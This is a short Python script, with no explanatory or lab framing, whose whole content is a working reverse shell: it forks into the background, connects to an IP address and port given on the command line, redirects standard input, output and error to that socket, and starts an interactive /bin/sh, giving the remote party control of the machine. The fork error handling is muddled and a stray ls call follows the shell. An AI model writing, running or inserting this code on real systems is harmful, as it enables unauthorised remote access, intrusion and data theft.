import socket
import subprocess
import os
import sys


def create_reverse_shell(ip: str, port: int):

    socket_handler = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        if os.fork() > 0:
            os._exit(0)
    except OSError as e:
        print(f"Error in fork process: {e.errno, e.strerror}")
        pid = os.fork()
        if pid > 0:
            print("Fork not valid!")

    socket_handler.connect((ip, port))
    os.dup2(socket_handler.fileno(), 0)
    os.dup2(socket_handler.fileno(), 1)
    os.dup2(socket_handler.fileno(), 2)
    shell_remote = subprocess.call(["/bin/sh", "-i"])
    list_files = subprocess.call(["/bin/ls", "-i"])


if __name__ == "__main__":
    ip = sys.argv[1]
    port = int(sys.argv[2])
    create_reverse_shell(ip, port)
